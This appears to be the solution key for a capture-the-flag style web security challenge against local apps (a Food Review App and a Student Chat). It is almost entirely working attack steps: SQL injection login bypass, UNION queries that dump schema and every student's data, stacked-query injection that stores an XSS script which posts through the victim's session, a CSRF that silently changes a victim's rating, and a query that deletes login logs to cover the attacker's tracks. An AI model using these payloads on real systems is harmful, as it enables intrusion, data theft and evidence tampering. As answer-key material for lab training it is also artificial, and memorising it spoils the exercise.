# Solution C2

## 1. Confirm SQL injection

In the Food Review App login form, submit:

- Username: `rafid.bari' -- -`
- Password: anything

The trailing `-- -` comments out the `AND password = '...'` clause entirely, so the
login succeeds without the password ever being checked.

## 2. Find the column count

```sql
rafid.bari' ORDER BY 7 -- -
rafid.bari' ORDER BY 8 -- -
```

`ORDER BY 7` succeeds, `ORDER BY 8` fails. The `review` table has seven columns
(`student_id, first_name, last_name, username, password, rating, review_text`).

## 3. Discover tables and columns

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(table_name),'x','x',0,0 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```

Expected relevant output (rendered in the unescaped `last_name` position):

```text
log,review
```

Column discovery:

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),'x','x',0,0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='review' -- -
```

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),'x','x',0,0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='log' -- -
```

## 4. Extract every student's rating and review

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(student_id,' ',username,':',COALESCE(rating,'none'),':',COALESCE(review_text,'none') ORDER BY student_id SEPARATOR '<br>'),'x','x',0,0 FROM review -- -
```

Submit this as the **username** field (password field can be anything, since the UNION
row satisfies the login check regardless of the WHERE clause on the real table). The
rendered page lists all fifteen students with their exact current `rating` and
`review_text`, including the two who have not reviewed yet.

## 5. Persist the stored-XSS payload

First log in to Student Chat as `rafid.bari` using password `chat-Rafid-99`. Keep that
browser session active.

Then submit the following Food Review App login:

- Username: `rafid.bari`
- Password:

```sql
bari-99'; UPDATE review SET last_name='<script>fetch("http://localhost:9001/send",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},credentials:"include",body:"body="+encodeURIComponent("<a href=http://localhost:9000/review/5>This food place is very good - 5/5</a>")});</script>' WHERE student_id=9900001; -- -
```

Why this works:

- The first statement still checks the real password (`bari-99`), so this login
  request itself behaves like a normal, successful login.
- The second, stacked statement updates only the attacker's own `last_name`.
- The Food Review App renders `last_name` without escaping it, so the stored
  `<script>` will execute the next time the attacker's profile is rendered.
- The script posts to Student Chat's `/send` endpoint with `credentials: "include"`,
  which rides on the attacker's already-active Student Chat session cookie.
- The chat message body is also rendered without escaping in Student Chat, so the
  embedded `<a href=...>` renders as a real, clickable link.

## 6. Trigger and verify the Food Review App to Student Chat compromise

Log in to the Food Review App again normally:

- Username: `rafid.bari`
- Password: `bari-99`

The profile page renders the stored script, which fires a request to Student Chat.
Open `http://localhost:9001` while still logged in as `rafid.bari`. A new message
should appear:

```text
Rafid Bari: This food place is very good - 5/5
```

with the text a clickable link to `http://localhost:9000/review/5`.

## 7. Final CSRF

Log in to the Food Review App as the victim (`mahin.kader` / `kader-99`) in a separate
browser/session, and confirm their starting rating is `3` with review text "Average
experience." Then, while logged in, click the link in Student Chat (or navigate
directly to `http://localhost:9000/review/5`).

The `/review/5` page's inline script performs:

```js
fetch("/submit-review", {
  method: "POST",
  headers: { "content-type": "application/x-www-form-urlencoded" },
  credentials: "include",
  body: "rating=5"
});
```

Because `/submit-review` has no CSRF token and identifies the student purely from the
session cookie, and because no `review_text` is included in the forged request, this
silently sets the victim's `rating` to `5` while leaving their existing review text
("Average experience.") untouched. Confirm by reloading the Food Review App as the
victim: the rating field should now read `5`.

## Bonus cleanup

Discover the `log` table through the schema steps above. Then submit as the attacker:

- Username: `rafid.bari`
- Password:

```sql
bari-99'; DELETE FROM log WHERE submitted_username='rafid.bari'; -- -
```

This removes only login-attempt evidence attributable to the attacker's own username.
The two pre-seeded rows for `mahin.kader` and `shahriar.karmaker`, and any other
students' rows, should remain.
